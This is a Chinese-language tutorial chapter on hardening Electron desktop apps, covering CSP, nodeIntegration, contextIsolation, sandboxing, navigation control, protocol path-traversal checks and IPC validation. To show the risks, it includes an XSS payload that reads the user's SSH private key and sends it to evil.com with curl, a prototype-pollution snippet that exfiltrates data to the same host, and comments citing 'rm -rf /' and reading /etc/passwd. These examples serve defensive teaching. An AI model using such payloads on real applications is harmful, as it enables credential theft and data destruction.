# 第六章：安全

## 目录

- [Electron 安全威胁模型](#electron-安全威胁模型)
- [CSP 内容安全策略](#csp-内容安全策略)
- [nodeIntegration：为什么必须关闭](#nodeintegration为什么必须关闭)
- [contextIsolation 隔离原理](#contextisolation-隔离原理)
- [sandbox 沙箱机制](#sandbox-沙箱机制)
- [webSecurity 设置](#websecurity-设置)
- [远程内容加载风险](#远程内容加载风险)
- [protocol 自定义协议安全](#protocol-自定义协议安全)
- [会话与 cookie 安全](#会话与-cookie-安全)
- [安全审计清单](#安全审计清单)
- [深入理解](#深入理解)
- [常见问题](#常见问题)
- [实践建议](#实践建议)

---

## Electron 安全威胁模型

### 为什么 Electron 安全特别重要

Electron 应用比普通 Web 应用有**更大的攻击面**，因为：

```
普通 Web 应用:
  浏览器沙箱保护 → 恶意代码只能访问 Web API
  最坏情况: 窃取 cookie、XSS 劫持页面

Electron 应用 (如果配置不当):
  Node.js 完全访问 → 恶意代码可以访问整个操作系统
  最坏情况: 读写任意文件、执行系统命令、安装恶意软件

  ┌───────────────────────────────────────────────────┐
  │  攻击面对比                                       │
  │                                                    │
  │  Web 应用:     [████░░░░░░░░░░░░░░░░]  受限       │
  │  Electron 应用: [████████████████████]  如果配置不当 │
  │  正确配置后:    [████████░░░░░░░░░░░░]  可控       │
  └───────────────────────────────────────────────────┘
```

### 攻击向量

```
Electron 应用可能面临的攻击：

  1. XSS (跨站脚本)
     ├── 不信任的 HTML 内容注入
     ├── 用户输入未转义
     └── 第三方库的 XSS 漏洞
         │
         ▼
     如果 nodeIntegration: true → 攻击者获得完全系统权限

  2. 恶意远程内容
     ├── loadURL 加载不可信网页
     ├── 中间人攻击 (HTTP 而非 HTTPS)
     └── DNS 劫持
         │
         ▼
     恶意页面获得应用权限

  3. 依赖供应链攻击
     ├── npm 包被注入恶意代码
     ├── 打包时包含恶意依赖
     └── 通过 postinstall 脚本执行代码

  4. IPC 消息伪造
     ├── 渲染进程发送恶意 IPC 消息
     ├── 参数注入（如路径穿越）
     └── 未验证的 channel 访问

  5. 自定义协议劫持
     ├── myapp:// 协议被恶意调用
     └── 协议处理器中的路径穿越
```

---

## CSP 内容安全策略

Content Security Policy (CSP) 是浏览器的安全机制，限制页面可以加载和执行哪些资源。在 Electron 中同样重要。

### 基本 CSP 配置

```html
<!-- 在 HTML <head> 中设置 CSP -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
">
```

### CSP 指令详解

```
CSP 指令：

  default-src    │ 默认策略（其他指令未指定时的回退）
  script-src     │ JavaScript 来源
  style-src      │ CSS 来源
  img-src        │ 图片来源
  font-src       │ 字体来源
  connect-src    │ fetch/XHR/WebSocket 目标
  media-src      │ 音视频来源
  frame-src      │ iframe 来源
  object-src     │ <object>/<embed> 来源
  worker-src     │ Web Worker 来源

  值：
  'self'         │ 同源（本地文件或相同域名）
  'none'         │ 禁止
  'unsafe-inline'│ 允许内联脚本/样式（尽量避免）
  'unsafe-eval'  │ 允许 eval()（千万不要用！）
  https:         │ 任何 HTTPS 源
  data:          │ data: URI
  具体域名       │ https://api.example.com
```

### 推荐的 Electron CSP

```html
<!-- 严格模式（推荐） -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self' https://api.yourapp.com;
">
```

### 通过主进程设置 CSP

```javascript
// 更安全的方式：通过响应头设置 CSP
app.whenReady().then(() => {
  session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [
          "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
        ]
      }
    })
  })
})
```

---

## nodeIntegration：为什么必须关闭

### nodeIntegration 是什么

`nodeIntegration` 控制渲染进程是否可以直接使用 Node.js API：

```javascript
// ❌ 危险配置
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true,  // 千万不要！
  }
})

// 开启后，页面中可以直接：
// const fs = require('fs')
// fs.readFileSync('/etc/passwd')
// require('child_process').exec('rm -rf /')
```

### 攻击示例

```javascript
// 假设你的应用有一个评论框，显示用户输入的 HTML
// 如果 nodeIntegration: true:

// 恶意用户提交的"评论"：
const maliciousComment = `
  <img src="x" onerror="
    const { exec } = require('child_process');
    exec('curl https://evil.com/steal?data=' + 
      require('fs').readFileSync('/Users/victim/.ssh/id_rsa'));
  ">
`

// 这段代码会：
// 1. 读取用户的 SSH 私钥
// 2. 发送到攻击者的服务器
// 全部在用户毫不知情的情况下完成
```

### 正确做法

```javascript
// ✅ 始终关闭 nodeIntegration（这是默认值）
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,      // 默认 false
    contextIsolation: true,       // 默认 true
    preload: path.join(__dirname, 'preload.js'),
  }
})

// 通过 preload + contextBridge 暴露精确的白名单 API
// 而不是暴露整个 Node.js
```

---

## contextIsolation 隔离原理

### 原理

`contextIsolation` 让 preload 脚本运行在独立的 JavaScript 上下文中，防止原型链污染攻击：

```
contextIsolation: false (危险):

  ┌──────────────────────────────────────┐
  │          单一 JS 上下文              │
  │                                      │
  │  preload 代码和网页代码共享:         │
  │  - Object.prototype                  │
  │  - Array.prototype                   │
  │  - Function.prototype                │
  │  - 所有全局对象                      │
  │                                      │
  │  网页可以修改原型来劫持 preload 行为 │
  └──────────────────────────────────────┘

contextIsolation: true (安全):

  ┌──────────────────┐    ┌──────────────────┐
  │  Isolated World  │    │   Main World     │
  │  (preload)       │    │   (网页)         │
  │                  │    │                  │
  │  Object.proto A  │    │  Object.proto B  │
  │  Array.proto A   │    │  Array.proto B   │
  │  独立的原型链    │    │  独立的原型链    │
  │                  │    │                  │
  │  contextBridge ──┼────┼→ window.api      │
  └──────────────────┘    └──────────────────┘
  
  两个世界有完全独立的 JS 原型和全局对象
```

### 原型链污染攻击示例

```javascript
// 没有 contextIsolation 时的攻击：

// preload.js (在同一个上下文中)
window.api = {
  readFile: (path) => {
    // 使用 fs.readFileSync 读取文件
    return require('fs').readFileSync(path, 'utf-8')
  }
}

// 恶意网页在 preload 执行前修改原型：
Object.defineProperty(Object.prototype, 'then', {
  get() {
    // 当 preload 返回的对象被当作 Promise 使用时
    // 窃取返回值
    return (resolve) => {
      fetch('https://evil.com/steal?data=' + JSON.stringify(this))
      resolve(this)
    }
  }
})

// 有了 contextIsolation，网页修改的原型不影响 preload
```

---

## sandbox 沙箱机制

### 沙箱的作用层级

```
安全层级（由外到内）：

  Level 1: OS 进程沙箱 (sandbox: true)
  ┌────────────────────────────────────────┐
  │  渲染进程受操作系统级别限制:           │
  │  - 不能直接读写文件系统               │
  │  - 不能创建子进程                     │
  │  - 不能访问网络套接字                 │
  │  - 系统调用被过滤                     │
  └────────────────────────────────────────┘

  Level 2: Context Isolation (contextIsolation: true)
  ┌────────────────────────────────────────┐
  │  JS 上下文隔离:                        │
  │  - preload 和网页有独立原型链          │
  │  - 防止原型链污染                     │
  └────────────────────────────────────────┘

  Level 3: CSP (Content Security Policy)
  ┌────────────────────────────────────────┐
  │  资源加载限制:                         │
  │  - 限制脚本来源                       │
  │  - 限制网络请求目标                   │
  │  - 禁止 eval 等危险操作               │
  └────────────────────────────────────────┘

  Level 4: IPC 白名单
  ┌────────────────────────────────────────┐
  │  API 暴露最小化:                       │
  │  - 只暴露必需的 IPC 通道              │
  │  - 参数验证和清理                     │
  └────────────────────────────────────────┘
```

### 沙箱模式配置

```javascript
// Electron 28+ 默认启用沙箱
new BrowserWindow({
  webPreferences: {
    sandbox: true,  // 默认值
  }
})

// 全局启用（推荐）
app.enableSandbox()  // 在 app.whenReady() 之前调用
```

---

## webSecurity 设置

```javascript
// ✅ 始终保持 webSecurity: true（默认值）
new BrowserWindow({
  webPreferences: {
    webSecurity: true,  // 默认值，不要改
  }
})

// ❌ 关闭 webSecurity 的风险
// webSecurity: false 会：
// 1. 禁用同源策略
// 2. 允许跨域请求
// 3. 允许 file:// 协议的跨域访问

// 如果需要跨域请求，正确做法是：
// 方案 1: 在主进程中做网络请求
ipcMain.handle('api:fetch', async (_, url, options) => {
  const response = await fetch(url, options)
  return response.json()
})

// 方案 2: 配置 CORS 代理
session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  callback({
    requestHeaders: {
      ...details.requestHeaders,
      Origin: 'https://your-allowed-origin.com'
    }
  })
})
```

---

## 远程内容加载风险

### 风险分析

```
加载远程内容的风险链：

  win.loadURL('https://example.com')
       │
       ├── 中间人攻击 (MITM)
       │     └── 如果用 HTTP 而非 HTTPS
       │
       ├── DNS 劫持
       │     └── 用户连接了恶意 WiFi
       │
       ├── 恶意重定向
       │     └── 第三方网站被入侵
       │
       └── XSS 攻击
             └── 远程页面有 XSS 漏洞
                   │
                   ▼
             如果有 Node 权限 → 系统被完全控制
```

### 安全加载远程内容

```javascript
// 如果必须加载远程内容，确保：

const win = new BrowserWindow({
  webPreferences: {
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,
    // 不要配置 preload（远程内容不需要 Node 桥接）
  }
})

// 1. 只加载 HTTPS
win.loadURL('https://trusted-site.com')

// 2. 拦截导航，防止跳转到恶意站点
win.webContents.on('will-navigate', (event, url) => {
  const allowed = ['https://trusted-site.com']
  if (!allowed.some(a => url.startsWith(a))) {
    event.preventDefault()
    console.warn('阻止导航到:', url)
  }
})

// 3. 阻止新窗口创建
win.webContents.setWindowOpenHandler(({ url }) => {
  // 在外部浏览器打开
  if (url.startsWith('https://')) {
    shell.openExternal(url)
  }
  return { action: 'deny' }  // 阻止创建新窗口
})

// 4. 禁止加载不安全的资源
session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
  const url = new URL(details.url)
  if (url.protocol === 'http:' && url.hostname !== 'localhost') {
    callback({ cancel: true })
    return
  }
  callback({})
})
```

---

## protocol 自定义协议安全

```javascript
const { protocol } = require('electron')

// 注册自定义协议
protocol.registerSchemesAsPrivileged([{
  scheme: 'app',
  privileges: {
    standard: true,
    secure: true,
    supportFetchAPI: true,
    corsEnabled: false,      // 不允许 CORS
    stream: true,
  }
}])

app.whenReady().then(() => {
  // 安全的协议处理
  protocol.handle('app', (request) => {
    const url = new URL(request.url)
    let filePath = path.join(__dirname, 'renderer', url.pathname)
    
    // ⚠️ 关键：防止路径穿越攻击
    const resolvedPath = path.resolve(filePath)
    const safeDir = path.resolve(__dirname, 'renderer')
    
    if (!resolvedPath.startsWith(safeDir)) {
      // 路径穿越尝试！
      return new Response('Forbidden', { status: 403 })
    }
    
    try {
      const data = fs.readFileSync(resolvedPath)
      const ext = path.extname(resolvedPath).toLowerCase()
      const mimeTypes = {
        '.html': 'text/html',
        '.js': 'application/javascript',
        '.css': 'text/css',
        '.png': 'image/png',
        '.jpg': 'image/jpeg',
        '.svg': 'image/svg+xml',
        '.json': 'application/json',
      }
      return new Response(data, {
        headers: { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' }
      })
    } catch {
      return new Response('Not Found', { status: 404 })
    }
  })
})
```

---

## 会话与 cookie 安全

```javascript
const { session } = require('electron')

app.whenReady().then(() => {
  const ses = session.defaultSession

  // 1. 清理敏感 cookie
  async function clearSensitiveData() {
    await ses.clearStorageData({
      storages: ['cookies', 'localstorage', 'sessionstorage'],
    })
  }

  // 2. 拦截 cookie 设置
  ses.cookies.on('changed', (event, cookie, cause, removed) => {
    if (!removed && !cookie.secure && cookie.domain !== 'localhost') {
      // 阻止非安全 cookie
      ses.cookies.remove(cookie.url, cookie.name)
      console.warn('阻止不安全的 cookie:', cookie.name)
    }
  })

  // 3. 配置权限请求处理
  ses.setPermissionRequestHandler((webContents, permission, callback) => {
    const allowed = ['notifications', 'clipboard-read']
    
    if (allowed.includes(permission)) {
      callback(true)
    } else {
      console.warn('拒绝权限请求:', permission)
      callback(false)
    }
  })

  // 4. 设置代理（如果需要）
  // ses.setProxy({ proxyRules: 'socks5://127.0.0.1:1080' })
})
```

---

## 安全审计清单

```
Electron 安全审计清单：

基础配置 (必须):
  □ nodeIntegration: false (默认)
  □ contextIsolation: true (默认)
  □ sandbox: true (默认 v28+)
  □ webSecurity: true (默认)
  □ allowRunningInsecureContent: false (默认)
  □ experimentalFeatures: false (默认)

CSP:
  □ 配置了 Content-Security-Policy
  □ 没有 'unsafe-eval'
  □ 没有 'unsafe-inline'（style-src 除外）
  □ script-src 限制为 'self'

IPC:
  □ preload 中使用白名单 channel
  □ ipcMain.handle 验证参数
  □ 不暴露通用的 ipcRenderer.send
  □ 不暴露 ipcRenderer 对象本身

导航:
  □ 拦截 will-navigate 事件
  □ 控制 window.open (setWindowOpenHandler)
  □ 不加载不受信任的远程内容

协议:
  □ 自定义协议做了路径穿越防护
  □ 不使用 file:// 加载远程引用的资源

依赖:
  □ 定期更新 Electron 版本
  □ 审计 npm 依赖 (npm audit)
  □ 不在渲染进程中使用未审计的第三方库

数据:
  □ 敏感数据使用加密存储
  □ 不在 localStorage 存密码/token
  □ 使用系统 Keychain 存储凭据

打包:
  □ 代码签名
  □ macOS notarization
  □ HTTPS 更新服务器
  □ 更新包签名校验
```

---

## 深入理解

### Electron 的安全模型演进

```
Electron 安全设置的默认值演进：

  版本     nodeIntegration  contextIsolation  sandbox
  ─────    ───────────────  ────────────────  ─────────
  < v5     true (危险!)     false             false
  v5-v11   false            false             false
  v12-v19  false            true              false
  v20-v27  false            true              部分
  v28+     false            true              true

  趋势：越来越安全，默认值越来越严格
```

### IPC 参数验证

```javascript
// ❌ 危险：不验证参数
ipcMain.handle('read-file', async (event, filePath) => {
  return fs.readFileSync(filePath, 'utf-8')
  // 攻击者可以读取任何文件：'/etc/passwd', '~/.ssh/id_rsa'
})

// ✅ 安全：验证参数
ipcMain.handle('read-file', async (event, filePath) => {
  // 1. 类型检查
  if (typeof filePath !== 'string') {
    throw new Error('Invalid file path')
  }
  
  // 2. 路径限制：只允许在特定目录内
  const resolvedPath = path.resolve(filePath)
  const safeDir = path.resolve(app.getPath('userData'), 'documents')
  
  if (!resolvedPath.startsWith(safeDir)) {
    throw new Error('Access denied: path outside allowed directory')
  }
  
  // 3. 文件类型限制
  const ext = path.extname(resolvedPath).toLowerCase()
  const allowedExts = ['.md', '.txt', '.json']
  if (!allowedExts.includes(ext)) {
    throw new Error('File type not allowed')
  }
  
  return fs.readFileSync(resolvedPath, 'utf-8')
})
```

### 验证 IPC 来源

```javascript
ipcMain.handle('sensitive-action', async (event, data) => {
  // 验证请求来自可信的窗口
  const webContents = event.sender
  const url = webContents.getURL()
  
  // 只允许本地页面调用
  if (!url.startsWith('file://') && !url.startsWith('app://')) {
    throw new Error('Unauthorized: remote content cannot call this API')
  }
  
  // 检查是不是已知的窗口
  const win = BrowserWindow.fromWebContents(webContents)
  if (!win || !trustedWindows.has(win.id)) {
    throw new Error('Unauthorized window')
  }
  
  // 执行敏感操作
  return performSensitiveAction(data)
})
```

---

## 常见问题

### Q1: 为什么 style-src 需要 'unsafe-inline'？

许多 CSS-in-JS 方案（styled-components、emotion）会注入内联样式。如果需要这些库，`style-src 'unsafe-inline'` 是可接受的折衷。但 `script-src` 绝对不能用 `unsafe-inline`。

### Q2: 开发阶段需要设这么严格吗？

是的。安全配置应从开发初期就正确设置。在开发阶段忽略安全，上线前再修通常会导致大量重构。

### Q3: electron-store 的数据安全吗？

`electron-store` 默认存储为明文 JSON。对于敏感数据：
- 使用 `electron-store` 的 `encryptionKey` 选项
- 或者使用系统 Keychain（macOS Keychain / Windows Credential Store）

### Q4: asar 能保护源码吗？

asar 只是打包格式，**不提供任何安全保护**。任何人都可以用 `asar extract` 解包查看源码。不要在前端代码中硬编码任何密钥。

---

## 实践建议

### 1. 最小权限原则

```javascript
// 只暴露渲染进程确实需要的 API

// ❌ 过度暴露
contextBridge.exposeInMainWorld('api', {
  exec: (cmd) => ipcRenderer.invoke('exec', cmd),  // 危险！
  readFile: (path) => ipcRenderer.invoke('read-file', path),  // 过于通用
})

// ✅ 精确暴露
contextBridge.exposeInMainWorld('api', {
  // 只暴露具体业务功能，不暴露底层能力
  loadDocument: (docId) => ipcRenderer.invoke('document:load', docId),
  saveDocument: (docId, content) => ipcRenderer.invoke('document:save', docId, content),
  getSettings: () => ipcRenderer.invoke('settings:get'),
})
```

### 2. 依赖安全

```bash
# 定期检查依赖漏洞
npm audit

# 自动修复
npm audit fix

# 使用 lockfile 确保依赖版本一致
npm ci  # 而非 npm install

# 考虑使用 Socket.dev 或 Snyk 做持续安全监控
```

### 3. 安全更新策略

- **每季度**至少更新一次 Electron 版本
- 关注 Electron 安全公告：https://www.electronjs.org/blog/category/security
- Chromium CVE 修复会随 Electron 更新发布
- 安全更新应该作为**强制更新**推送

---

## 本章小结

Electron 安全的核心原则：

1. **默认安全**：保持所有安全相关选项的默认值
2. **最小权限**：只暴露必要的 API
3. **验证一切**：IPC 参数、导航目标、文件路径
4. **CSP 配置**：限制资源来源
5. **沙箱隔离**：进程级 + JS 上下文级
6. **保持更新**：及时更新 Electron 和依赖

安全不是一次性的配置，而是持续的实践。

---

> **上一篇**：[05 - 原生系统 API](./05-native-api.md)  
> **下一篇**：[07 - 数据存储](./07-data-storage.md)
